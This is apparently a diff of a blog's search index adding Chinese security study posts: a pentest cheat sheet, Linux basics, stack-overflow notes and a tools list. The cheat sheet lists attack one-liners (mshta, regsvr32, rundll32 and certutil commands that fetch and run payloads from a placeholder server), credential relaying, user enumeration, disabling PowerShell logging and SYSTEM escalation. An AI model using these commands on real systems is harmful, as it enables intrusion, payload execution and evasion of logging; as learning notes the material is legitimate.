@@ -1,6 +1,364 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>HACKER-USEFUL-GUIDE</title>
+    <url>/2021/12/25/HACKER-USEFUL-GUIDE/</url>
+    <content><![CDATA[<ul>
+<li><a href="#%E7%BD%91%E7%BB%9C%E5%8F%91%E7%8E%B0">网络发现</a></li>
+<li><a href="#%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACxss">跨站脚本（XSS）</a></li>
+<li><a href="#%E5%9C%A8%E6%B2%A1%E6%9C%89%E5%87%AD%E8%AF%81%E7%9A%84%E7%BD%91%E7%BB%9C%E4%B8%8A">在没有凭证的网络上</a></li>
+<li><a href="#%E6%9E%9A%E4%B8%BE%E6%B2%A1%E6%9C%89%E5%87%AD%E8%AF%81%E7%9A%84%E7%94%A8%E6%88%B7">枚举没有凭证的用户</a></li>
+<li><a href="#%E4%BB%8E%E5%86%85%E5%AD%98%E4%B8%AD%E6%8F%90%E5%8F%96%E6%98%8E%E6%96%87%E6%96%87%E6%9C%AC%E5%87%AD%E8%AF%81">从内存中提取明文文本凭证</a></li>
+<li><a href="#%E8%84%9A%E6%9C%AC%E8%87%AA%E5%8A%A8%E5%8C%96%E9%85%8D%E7%BD%AE">脚本自动化配置</a></li>
+<li><a href="#%E7%A6%81%E7%94%A8%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95">禁用日志记录</a></li>
+<li><a href="#windows%E4%B8%8Bcmd%E4%BB%8Einternet%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E5%AE%9E%E4%BE%8B">windows下cmd从internet下载文件实例</a></li>
+<li><a href="#win%E4%BB%8E%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E5%91%98%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90">win从本地管理员获取系统权限</a></li>
+</ul>
+<h3 id="网络发现"><a href="#网络发现" class="headerlink" title="网络发现"></a>网络发现</h3><ol>
+<li>Burp Suite</li>
+<li>OWASP ZAP（开源）</li>
+<li>Dirbuster</li>
+<li>GoBuster：轻量级、快速的目录和子域名爆破工具</li>
+</ol>
+<h3 id="跨站脚本（XSS）"><a href="#跨站脚本（XSS）" class="headerlink" title="跨站脚本（XSS）"></a>跨站脚本（XSS）</h3><ol>
+<li>BeFF（浏览器漏洞利用框架）：将JavaScript静荷注入到浏览器中，创建一个命令和控制通道，以便javascript后期利用</li>
+<li>分两部分：服务器，攻击静荷</li>
+<li>盲XSS：执行存储的XSS静荷时看不到回显效果（例如：<a href="%22%E8%81%94%E7%B3%BB%E6%88%91%E4%BB%AC%22" title="%22%E8%81%94%E7%B3%BB%E6%88%91%E4%BB%AC%22">“联系我们”</a>）<ol>
+<li>XSS Hunter工具验证盲XSS</li>
+</ol>
+</li>
+</ol>
+<h3 id="在没有凭证的网络上"><a href="#在没有凭证的网络上" class="headerlink" title="在没有凭证的网络上"></a>在没有凭证的网络上</h3><ol>
+<li>Responder工具<ol>
+<li>http伪装windows验证：<code>sudo responder -I eth0 -wfFbw</code></li>
+</ol>
+</li>
+<li>MultiRelay.py</li>
+</ol>
+<h3 id="枚举没有凭证的用户"><a href="#枚举没有凭证的用户" class="headerlink" title="枚举没有凭证的用户"></a>枚举没有凭证的用户</h3><ol>
+<li>nmap：<code>nmap -p88 --script krb5-enum-users --script-args krb5-enum-users.realm=&quot;cyberspacekittens.local&quot;,userdb=/opt/userlist.txt 10.100.100.200</code></li>
+<li>CrackMapExec（CME）扫描：<code>cme smb 10.100.100.0/24 -d &#39;cyberspacekittens.local&#39; -u &#39;neil.pawstrong&#39; -p &#39;.wertSDFG&#39; -M empire_exec -o LISTENER=http</code></li>
+</ol>
+<h3 id="从内存中提取明文文本凭证"><a href="#从内存中提取明文文本凭证" class="headerlink" title="从内存中提取明文文本凭证"></a>从内存中提取明文文本凭证</h3><ol>
+<li>（针对win10）Mimikatz</li>
+<li>（针对浏览器）Mimikittenz</li>
+</ol>
+<h3 id="脚本自动化配置"><a href="#脚本自动化配置" class="headerlink" title="脚本自动化配置"></a>脚本自动化配置</h3><ol>
+<li>RC脚本自动化Metasploit</li>
+<li>Empire自动化</li>
+<li>Conbalt Strike自动化</li>
+</ol>
+<h3 id="禁用日志记录"><a href="#禁用日志记录" class="headerlink" title="禁用日志记录"></a>禁用日志记录</h3><ol>
+<li>禁用powershell日志记录</li>
+</ol>
+<h3 id="windows下cmd从internet下载文件实例"><a href="#windows下cmd从internet下载文件实例" class="headerlink" title="windows下cmd从internet下载文件实例"></a>windows下cmd从internet下载文件实例</h3><ol>
+<li>利用windows“功能”：<ul>
+<li><code>mshta vbscript:Close(Execute(&quot;GetObject(&quot;&quot;script:http://webserver/payload.sct&quot;&quot;)&quot;))</code></li>
+<li><code>mshta http://webserver/payload.hta</code></li>
+<li><code>rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication&quot;;o=GetObject(&quot;script:http://webserver/payload.sct&quot;);windows.close();</code></li>
+<li><code>regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll</code></li>
+<li><code>certutil -urlcache -split -f http://server/payload payload</code></li>
+<li><code>certutil -urlcache -split -f http://server/payload.b64 payload.b64 &amp;certutil -decode payload.b64 payload.dll &amp; C:\\Windows\Microsoft.NET\Framework64\ v4.0.30319\InstallUtil/logfile=/LogToConsole=false /u payload.dll</code></li>
+<li><code>certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 &amp;certutil -decode payload.b64 payload.exe &amp; payload.exe</code></li>
+</ul>
+</li>
+</ol>
+<h3 id="win从本地管理员获取系统权限"><a href="#win从本地管理员获取系统权限" class="headerlink" title="win从本地管理员获取系统权限"></a>win从本地管理员获取系统权限</h3><ol>
+<li>decoder-it创建一个PowerShell脚本，将本地管理Powershell提示符转换为System权限，通过创建一个新进程，设置新进程父类进程为系统进程。<ul>
+<li>C:&gt;<code>..\psgetsys.psl</code></li>
+<li>C:&gt;<code>[MyProcess]::CreateProcessFromParent(&lt;process_run_by_system&gt;,&lt;command_to_execute&gt;)</code></li>
+</ul>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+        <category>WEB渗透</category>
+      </categories>
+      <tags>
+        <tag>渗透</tag>
+        <tag>网络空间安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>LINUX OS</title>
+    <url>/2022/03/22/LINUX-OS/</url>
+    <content><![CDATA[<h1 id="Linux系统基础"><a href="#Linux系统基础" class="headerlink" title="Linux系统基础"></a>Linux系统基础</h1><ol>
+<li>MBR：主引导记录</li>
+<li>grub2引导<br>(grub「grand unified bootloader 宏大的统一引导启动程序」：幼虫，搜寻)<ol>
+<li>boot.img</li>
+<li>core.img</li>
+<li>*.mod</li>
+<li>grub.cfg<br> a. 未独立&#x2F;boot：&#x2F;boot&#x2F;grub2&#x2F;grub.cfg<br> b. 独立&#x2F;boot:&#x2F;grub2&#x2F;grub.cfg</li>
+<li>grun2-setpassword：设置引导密码</li>
+</ol>
+</li>
+<li>init：PID&#x3D;1（进程号）<ol>
+<li>centos7第一个进程：systemd（配置文件：&#x2F;usr&#x2F;system&#x2F;systemd&#x2F;）</li>
+<li>执行登录 &#x2F;bin&#x2F;login</li>
+</ol>
+</li>
+<li>demesg | less：“|”管道符，左侧命令输出作为右侧的输入</li>
+<li>&#x2F;dev：设备 –&gt; 文件</li>
+<li>&#x2F;usr：unix shared resources（共享资源）「类似win的Program Files」</li>
+<li>&#x2F;src：原文件</li>
+<li>&#x2F;tmp：临时文件</li>
+<li>&#x2F;var（variable）：日志文件、打印机脱机工作文件、缓冲区</li>
+<li>&#x2F;opt（option）：选项文件</li>
+<li>&#x2F;mnt（mount）：挂载</li>
+<li>cd：change directory</li>
+<li>文件类型：<ol>
+<li>d：目录</li>
+<li>l：链接</li>
+<li>b：块设备</li>
+<li>c：字符设备文件</li>
+<li>-：普通文件</li>
+</ol>
+</li>
+<li>文件权限：<ol>
+<li>用户组：U &#x2F; G &#x2F; A</li>
+<li>九位字母表示法：d[文件类型] rwx[文件属主] r-x[同组用户] r–[其他用户]</li>
+</ol>
+</li>
+<li>cat快速编辑：<ol>
+<li>cat&gt;test</li>
+<li>[输入字符]</li>
+</ol>
+</li>
+<li>tail &amp; head：查看后十行，前十行 &#x2F;&#x2F;-n num : 指定行数</li>
+<li>mdir [ -m ] [ -p 目录名 ]</li>
+<li>rmdir（remove dir）：用于删除空目录<ol>
+<li>rm -r</li>
+</ol>
+</li>
+<li>touch：修改时间属性 * （不存在）创建文件</li>
+<li>软链接：ln -s</li>
+<li>硬链接：ln<ol>
+<li>以文件副本形式存在，不占用实际控件</li>
+<li>不允许目录硬链接</li>
+<li>只有在同一个文件系统才允许硬链接</li>
+</ol>
+</li>
+<li>查找类：which、whereis、find、grep</li>
+<li>文件重定向：<ul>
+<li>&#x2F;dev&#x2F;stdin：标准输入文件</li>
+<li>&#x2F;dev&#x2F;stdout：标准输出文件</li>
+</ul>
+<ol>
+<li>输出重定向<ol>
+<li>“&gt;”：文件存在，覆盖</li>
+<li>“&gt;&gt;”：文件存在，添加内容到文件末尾</li>
+</ol>
+</li>
+<li>输入重定向<ol>
+<li>“&lt;”</li>
+</ol>
+</li>
+<li>管道符重定向：“|” 左输出为右输入</li>
+</ol>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>开源项目</category>
+        <category>LINUX OS</category>
+      </categories>
+      <tags>
+        <tag>操作系统</tag>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ODAY-软件漏洞分析</title>
+    <url>/2022/01/06/ODAY-%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
+    <content><![CDATA[<ul>
+<li><a href="#%E4%B8%80-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86">一、基础知识</a><ul>
+<li><a href="#%E5%AE%9A%E4%B9%89">定义</a></li>
+<li><a href="#%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7">逆向分析工具</a></li>
+</ul>
+</li>
+<li><a href="#%E4%BA%8C-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">二、漏洞利用</a><ul>
+<li><a href="#%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8">栈溢出利用</a><ul>
+<li><a href="#1-%E7%B3%BB%E7%BB%9F%E6%A0%88">1. 系统栈</a><ul>
+<li><a href="#%E8%BF%9B%E7%A8%8B%E4%BD%BF%E7%94%A8%E7%9A%84%E5%86%85%E5%AD%98%E5%8C%BA%E5%9F%9F%E6%8C%89%E5%8A%9F%E8%83%BD%E5%88%92%E5%88%86">进程使用的内存区域按功能划分</a></li>
+<li><a href="#win32%E7%B3%BB%E7%BB%9F%E6%8F%90%E4%BE%9B%E4%BA%86%E4%B8%A4%E4%B8%AA%E7%89%B9%E6%AE%8A%E5%AF%84%E5%AD%98%E5%99%A8%E7%94%A8%E4%BA%8E%E6%A0%87%E8%AF%86%E4%BD%8D%E4%BA%8E%E7%B3%BB%E7%BB%9F%E6%A0%88%E6%A0%88%E9%A1%B6%E7%9A%84%E6%A0%88%E5%B8%A7">Win32系统提供了两个特殊寄存器用于标识位于系统栈栈顶的栈帧</a></li>
+<li><a href="#%E4%B8%8D%E5%90%8C%E7%BC%96%E8%AF%91%E5%99%A8%E8%B0%83%E7%94%A8%E6%96%B9%E5%BC%8F%E5%B7%AE%E5%BC%82">不同编译器调用方式差异</a></li>
+<li><a href="#%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E5%A4%A7%E8%87%B4%E6%AD%A5%E9%AA%A4">函数调用大致步骤：</a></li>
+<li><a href="#%E5%87%BD%E6%95%B0%E8%BF%94%E5%9B%9E%E5%A4%A7%E8%87%B4%E6%AD%A5%E9%AA%A4">函数返回大致步骤：</a></li>
+<li><a href="#%E6%89%A9%E5%85%85%E6%B1%87%E7%BC%96%E7%9F%A5%E8%AF%86%E4%B9%A6%E7%B1%8Dibm-x86%E6%B1%87%E7%BC%96%E6%88%96win32%E6%B1%87%E7%BC%96">+. 扩充汇编知识书籍：《IBM X86汇编》或《Win32汇编》</a></li>
+</ul>
+</li>
+<li><a href="#2-%E4%BF%AE%E6%94%B9%E9%82%BB%E6%8E%A5%E5%8F%98%E9%87%8F">2. 修改邻接变量</a></li>
+<li><a href="#3-%E4%BF%AE%E6%94%B9%E5%87%BD%E6%95%B0%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80">3. 修改函数返回地址</a></li>
+<li><a href="#4-%E4%BB%A3%E7%A0%81%E6%A4%8D%E5%85%A5">4. 代码植入</a></li>
+</ul>
+</li>
+<li><a href="#%E5%BC%80%E5%8F%91shellcode">开发shellcode</a></li>
+<li><a href="#metasploit%E5%BC%80%E5%8F%91exploit">MetaSploit开发Exploit</a></li>
+<li><a href="#%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8">堆溢出利用</a></li>
+<li><a href="#windows%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E6%9C%BA%E5%88%B6">Windows异常处理机制</a></li>
+<li><a href="#%E9%AB%98%E7%BA%A7%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF">高级内存攻击技术</a></li>
+<li><a href="#%E6%89%8B%E6%9C%BA%E9%87%8C%E7%9A%84%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA">手机里的缓冲区溢出</a></li>
+<li><a href="#%E5%85%B6%E4%BB%96%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF">其他软件漏洞利用技术</a></li>
+<li><a href="#windows%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6">Windows安全机制</a></li>
+<li><a href="#gs">GS</a></li>
+<li><a href="#safeseh">SafeSEH</a></li>
+<li><a href="#dep">DEP</a></li>
+<li><a href="#aslr">ASLR</a></li>
+<li><a href="#sehop">SEHOP</a></li>
+<li><a href="#%E5%A0%86%E4%BF%9D%E6%8A%A4%E4%B8%8E%E6%94%BB%E5%87%BB">堆保护与攻击</a></li>
+</ul>
+</li>
+<li><a href="#%E4%B8%89-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98">三、漏洞挖掘</a></li>
+<li><a href="#%E5%9B%9B-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">四、漏洞分析</a></li>
+</ul>
+<h1 id="一、基础知识"><a href="#一、基础知识" class="headerlink" title="一、基础知识"></a>一、基础知识</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><ol>
+<li>BUG：功能性逻辑缺陷</li>
+<li>漏洞：安全性逻辑缺陷（软件中缓冲区溢出漏洞、网站中跨站脚本xss漏洞、SQL注入漏洞等）</li>
+<li>0day响应：<ol>
+<li><a href="http://cve.mitre.org/" title="http://cve.mitre.org">CVE</a></li>
+<li><a href="http://www.cert.org/" title="http://www.cert.org">CERT</a></li>
+<li>微软安全中心”Black Tuesday“：每个月第二周星期二发布补丁</li>
+</ol>
+</li>
+<li><strong>PE文件格式</strong>：Win32平台下可执行文件遵守的数据格式（“*.exe” &#x2F; “*.dll”等）<ol>
+<li>.text：由编译器产生，存放二进制的机器码，是反汇编和调试的对象</li>
+<li>.data：初始化的数据块（如：宏定义、全局变量、静态变量等）</li>
+<li>.idata：可执行文件所使用的动态链接库等外来函数与文件的信息</li>
+<li>.rsrc：存放程序的资源（如图标、菜单等）</li>
+<li>.reloc 、.edata 、.tls 、.rdata</li>
+</ol>
+</li>
+<li><strong>“虚拟内存”</strong>（非操作系统中的虚拟内存）：在用户模式下，用调试器看到的内存地址 [指Windows用户态内存隐射机制下的虚拟内存]</li>
+<li><strong>PE文件与虚拟内存的映射</strong>：VA &#x3D; ImageBase + RVA<ol>
+<li>文件偏移地址（File Offset）</li>
+<li>装载基址（Image Base）</li>
+<li>虚拟内存地址（Virtual Address,VA）</li>
+<li>相对虚拟地址（Relative Virtual Address,RVA）</li>
+</ol>
+</li>
+</ol>
+<h2 id="逆向分析工具"><a href="#逆向分析工具" class="headerlink" title="逆向分析工具"></a>逆向分析工具</h2><ol>
+<li><p>OllyDbg</p>
+</li>
+<li><p>SoftICE</p>
+</li>
+<li><p>WinDbg</p>
+</li>
+<li><p>IDE Pro</p>
+</li>
+<li><p>二进制编辑器（Ultra Edit、Hex Workshop、WinHex）</p>
+</li>
+<li><p>虚拟机</p>
+</li>
+<li><p>Crack二进制文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//密码验证实验程序</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int verify_password(char *password)</span><br><span class="line">&#123;</span><br><span class="line">   int authenticated;</span><br><span class="line">   authenticated=strcmp(password,PASSWORD);</span><br><span class="line">   return authenticated;</span><br><span class="line">&#125;</span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">   int valid_flag = 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h1 id="二、漏洞利用"><a href="#二、漏洞利用" class="headerlink" title="二、漏洞利用"></a>二、漏洞利用</h1><h2 id="栈溢出利用"><a href="#栈溢出利用" class="headerlink" title="栈溢出利用"></a>栈溢出利用</h2><h3 id="1-系统栈"><a href="#1-系统栈" class="headerlink" title="1. 系统栈"></a>1. 系统栈</h3><ol>
+<li><h4 id="进程使用的内存区域按功能划分"><a href="#进程使用的内存区域按功能划分" class="headerlink" title="进程使用的内存区域按功能划分"></a>进程使用的内存区域<strong>按功能</strong>划分</h4><ol>
+<li>代码区：cpu在此区域取值执行</li>
+<li>数据区：存储全局变量等</li>
+<li>堆区：动态分配和回收。进程在堆区请求一定大小的内存</li>
+<li>栈区：用于动态地存储函数间的调用关系，保证被调用函数在返回时恢复到母函数继续执行。</li>
+</ol>
+</li>
+<li><h4 id="Win32系统提供了两个特殊寄存器用于标识位于系统栈栈顶的栈帧"><a href="#Win32系统提供了两个特殊寄存器用于标识位于系统栈栈顶的栈帧" class="headerlink" title="Win32系统提供了两个特殊寄存器用于标识位于系统栈栈顶的栈帧"></a>Win32系统提供了两个特殊寄存器用于标识位于系统栈栈顶的栈帧</h4><ol>
+<li>ESP（<a href="extended_stack_pointer" title="extended_stack_pointer">栈指针寄存器</a>）：存放一个永远指向系统栈<strong>最上面一个栈帧的顶部</strong></li>
+<li>EBP（<a href="extended_base_pointer" title="extended_base_pointer">基址指针寄存器</a>）：存放一个永远指向系统栈<strong>最上面一个栈帧的底部</strong></li>
+<li>当前函数栈帧：ESP和EBP之间的内存空间<ol>
+<li>局部变量：为函数局部变量开辟内存空间</li>
+<li>栈帧状态值：保存前栈帧的顶部和底部，用于本栈帧弹出后恢复上一个栈帧（实际只保存底部，顶部可以通过堆栈平衡计算得出）</li>
+<li>函数返回地址：保存当前函数调用前的断点信息，也就是<strong>函数调用前的指令位置</strong></li>
+</ol>
+</li>
+<li>另外的特殊寄存器：EIP（指令寄存器）存放下一条等待执行的指令地址</li>
+</ol>
+</li>
+<li><h4 id="不同编译器调用方式差异"><a href="#不同编译器调用方式差异" class="headerlink" title="不同编译器调用方式差异"></a>不同编译器调用方式差异</h4></li>
+</ol>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>C</th>
+<th>SysCall</th>
+<th>StdCall</th>
+<th>BASIC</th>
+<th>FORTRAN</th>
+<th>PASCAL</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>参数入栈顺序</td>
+<td>右-&gt;左</td>
+<td>右-&gt;左</td>
+<td>右-&gt;左</td>
+<td>左-&gt;右</td>
+<td>左-&gt;右</td>
+<td>左-&gt;右</td>
+</tr>
+<tr>
+<td>恢复栈平衡操作的位置</td>
+<td>母函数</td>
+<td>子函数</td>
+<td>子函数</td>
+<td>子函数</td>
+<td>子函数</td>
+<td>子函数</td>
+</tr>
+</tbody></table>
+<ol start="4">
+<li><h4 id="函数调用大致步骤："><a href="#函数调用大致步骤：" class="headerlink" title="函数调用大致步骤："></a>函数调用大致步骤：</h4><ol>
+<li>参数入栈：按入栈顺序</li>
+<li>返回地址入栈：将当前代码区调用指令的下一条指令地址压入栈，供函数返回时继续执行</li>
+<li>代码区跳转：处理器从当前代码区跳转到被调用函数的入口</li>
+<li>栈帧调整：<ol>
+<li>EBP入栈：保存当前栈帧状态值，以供后面恢复本栈帧时使用</li>
+<li>ESP装入EBP，更新栈帧底部：将当前栈帧切换到新栈帧</li>
+<li>把ESP减去所需空间的大小，太高栈顶：给新栈帧分配空间</li>
+</ol>
+</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;假设函数有三个参数，依次入栈</span><br><span class="line">push canshu1    </span><br><span class="line">push canshu2    </span><br><span class="line">push canshu3    </span><br><span class="line">call 函数地址    ;call完成两项工作：a.保存返回地址（入栈当前指令在内存中的位置） b. 跳转到函数的入口地址</span><br><span class="line">push ebp    ;保存旧栈的栈底</span><br><span class="line">mov ebp ,esp    ;栈帧切换：新栈帧底替换旧栈底</span><br><span class="line">sub esp ,xxx    ;太高栈顶，为新栈帧开辟内存空间：设置新栈帧的栈顶</span><br></pre></td></tr></table></figure>
+</li>
+<li><h4 id="函数返回大致步骤："><a href="#函数返回大致步骤：" class="headerlink" title="函数返回大致步骤："></a>函数返回大致步骤：</h4><ol>
+<li>保存返回值：通常保存在寄存器EAX</li>
+<li>弹出当前栈帧，恢复上一个栈帧<ol>
+<li>在堆栈平衡的基础上，给ESP加上栈帧的大小，降低栈顶，回收空间</li>
+<li>将（当前栈帧底部保存的）前栈帧EBP值 弹入 EBP寄存器，恢复出上一个栈帧</li>
+<li>将函数返回地址弹给EIP寄存器</li>
+</ol>
+</li>
+<li>跳转：按照返回地址跳回母函数继续执行</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">add esp ,xxx    ;降低栈顶，回收当前栈帧</span><br><span class="line">pop ebp    ;将上一个栈帧底部位置恢复到ebp</span><br><span class="line">retn    ;两个功能：a. 弹出当前栈顶元素（栈帧中的返回地址） b.处理器跳转到弹出的返回地址，恢复调用之前的代码区</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h4 id="扩充汇编知识书籍：《IBM-X86汇编》或《Win32汇编》"><a href="#扩充汇编知识书籍：《IBM-X86汇编》或《Win32汇编》" class="headerlink" title="+. 扩充汇编知识书籍：《IBM X86汇编》或《Win32汇编》"></a>+. 扩充汇编知识书籍：《IBM X86汇编》或《Win32汇编》</h4><h3 id="2-修改邻接变量"><a href="#2-修改邻接变量" class="headerlink" title="2. 修改邻接变量"></a>2. 修改邻接变量</h3><h3 id="3-修改函数返回地址"><a href="#3-修改函数返回地址" class="headerlink" title="3. 修改函数返回地址"></a>3. 修改函数返回地址</h3><h3 id="4-代码植入"><a href="#4-代码植入" class="headerlink" title="4. 代码植入"></a>4. 代码植入</h3><h2 id="开发shellcode"><a href="#开发shellcode" class="headerlink" title="开发shellcode"></a>开发shellcode</h2><h2 id="MetaSploit开发Exploit"><a href="#MetaSploit开发Exploit" class="headerlink" title="MetaSploit开发Exploit"></a>MetaSploit开发Exploit</h2><h2 id="堆溢出利用"><a href="#堆溢出利用" class="headerlink" title="堆溢出利用"></a>堆溢出利用</h2><h2 id="Windows异常处理机制"><a href="#Windows异常处理机制" class="headerlink" title="Windows异常处理机制"></a>Windows异常处理机制</h2><h2 id="高级内存攻击技术"><a href="#高级内存攻击技术" class="headerlink" title="高级内存攻击技术"></a>高级内存攻击技术</h2><h2 id="手机里的缓冲区溢出"><a href="#手机里的缓冲区溢出" class="headerlink" title="手机里的缓冲区溢出"></a>手机里的缓冲区溢出</h2><h2 id="其他软件漏洞利用技术"><a href="#其他软件漏洞利用技术" class="headerlink" title="其他软件漏洞利用技术"></a>其他软件漏洞利用技术</h2><h2 id="Windows安全机制"><a href="#Windows安全机制" class="headerlink" title="Windows安全机制"></a>Windows安全机制</h2><h2 id="GS"><a href="#GS" class="headerlink" title="GS"></a>GS</h2><h2 id="SafeSEH"><a href="#SafeSEH" class="headerlink" title="SafeSEH"></a>SafeSEH</h2><h2 id="DEP"><a href="#DEP" class="headerlink" title="DEP"></a>DEP</h2><h2 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h2><h2 id="SEHOP"><a href="#SEHOP" class="headerlink" title="SEHOP"></a>SEHOP</h2><h2 id="堆保护与攻击"><a href="#堆保护与攻击" class="headerlink" title="堆保护与攻击"></a>堆保护与攻击</h2><h1 id="三、漏洞挖掘"><a href="#三、漏洞挖掘" class="headerlink" title="三、漏洞挖掘"></a>三、漏洞挖掘</h1><h1 id="四、漏洞分析"><a href="#四、漏洞分析" class="headerlink" title="四、漏洞分析"></a>四、漏洞分析</h1>]]></content>
+      <categories>
+        <category>网络安全</category>
+        <category>PWN</category>
+      </categories>
+      <tags>
+        <tag>网络空间安全</tag>
+        <tag>安全漏洞</tag>
+        <tag>0day</tag>
+        <tag>Stack overflow</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MY FAVOR TOOLS BANK (我的&quot;武器/装备&quot;库)</title>
+    <url>/2022/03/22/My-Attack-Tools/</url>
+    <content><![CDATA[<h1 id="开源项目"><a href="#开源项目" class="headerlink" title="开源项目"></a>开源项目</h1><h2 id="JOPLIN"><a href="#JOPLIN" class="headerlink" title="JOPLIN"></a>JOPLIN</h2><h2 id="ANKI"><a href="#ANKI" class="headerlink" title="ANKI"></a>ANKI</h2><h2 id="MARKTEST"><a href="#MARKTEST" class="headerlink" title="MARKTEST"></a>MARKTEST</h2><h2 id="RIME"><a href="#RIME" class="headerlink" title="RIME"></a>RIME</h2><h2 id="ASF"><a href="#ASF" class="headerlink" title="ASF"></a>ASF</h2><h2 id="Virtualbox"><a href="#Virtualbox" class="headerlink" title="Virtualbox"></a>Virtualbox</h2><h2 id="PotPlayer"><a href="#PotPlayer" class="headerlink" title="PotPlayer"></a>PotPlayer</h2><h2 id="Neat-Download-Manager"><a href="#Neat-Download-Manager" class="headerlink" title="Neat Download Manager"></a>Neat Download Manager</h2><h2 id="OllyDBG"><a href="#OllyDBG" class="headerlink" title="OllyDBG"></a>OllyDBG</h2><h1 id="商业软件（部分含community版）"><a href="#商业软件（部分含community版）" class="headerlink" title="商业软件（部分含community版）"></a>商业软件（部分含community版）</h1><h2 id="Vmware"><a href="#Vmware" class="headerlink" title="Vmware"></a>Vmware</h2><h2 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a>Wireshark</h2><h2 id="Arduino"><a href="#Arduino" class="headerlink" title="Arduino"></a>Arduino</h2><h2 id="Pycharm"><a href="#Pycharm" class="headerlink" title="Pycharm"></a>Pycharm</h2><h2 id="Visual-Studio"><a href="#Visual-Studio" class="headerlink" title="Visual Studio"></a>Visual Studio</h2><h2 id="Visual-Studio-IDE"><a href="#Visual-Studio-IDE" class="headerlink" title="Visual Studio IDE"></a>Visual Studio IDE</h2>]]></content>
+      <categories>
+        <category>开源项目</category>
+        <category>software</category>
+      </categories>
+      <tags>
+        <tag>tools</tag>
+        <tag>open source</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>C/C++ PROGRAM-GUIDE</title>
     <url>/2022/03/17/C-PROGRAM-GUIDE/</url>
     <content><![CDATA[<!-- markdown="1" is required for GitHub Pages to render the TOC properly. -->
@@ -655,174 +1013,6 @@
       </tags>
   </entry>
   <entry>
-    <title>HACKER-USEFUL-GUIDE</title>
-    <url>/2021/12/25/HACKER-USEFUL-GUIDE/</url>
-    <content><![CDATA[<ul>
-<li><a href="#%E7%BD%91%E7%BB%9C%E5%8F%91%E7%8E%B0">网络发现</a></li>
-<li><a href="#%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACxss">跨站脚本（XSS）</a></li>
-<li><a href="#%E5%9C%A8%E6%B2%A1%E6%9C%89%E5%87%AD%E8%AF%81%E7%9A%84%E7%BD%91%E7%BB%9C%E4%B8%8A">在没有凭证的网络上</a></li>
-<li><a href="#%E6%9E%9A%E4%B8%BE%E6%B2%A1%E6%9C%89%E5%87%AD%E8%AF%81%E7%9A%84%E7%94%A8%E6%88%B7">枚举没有凭证的用户</a></li>
-<li><a href="#%E4%BB%8E%E5%86%85%E5%AD%98%E4%B8%AD%E6%8F%90%E5%8F%96%E6%98%8E%E6%96%87%E6%96%87%E6%9C%AC%E5%87%AD%E8%AF%81">从内存中提取明文文本凭证</a></li>
-<li><a href="#%E8%84%9A%E6%9C%AC%E8%87%AA%E5%8A%A8%E5%8C%96%E9%85%8D%E7%BD%AE">脚本自动化配置</a></li>
-<li><a href="#%E7%A6%81%E7%94%A8%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95">禁用日志记录</a></li>
-<li><a href="#windows%E4%B8%8Bcmd%E4%BB%8Einternet%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E5%AE%9E%E4%BE%8B">windows下cmd从internet下载文件实例</a></li>
-<li><a href="#win%E4%BB%8E%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E5%91%98%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90">win从本地管理员获取系统权限</a></li>
-</ul>
-<h3 id="网络发现"><a href="#网络发现" class="headerlink" title="网络发现"></a>网络发现</h3><ol>
-<li>Burp Suite</li>
-<li>OWASP ZAP（开源）</li>
-<li>Dirbuster</li>
-<li>GoBuster：轻量级、快速的目录和子域名爆破工具</li>
-</ol>
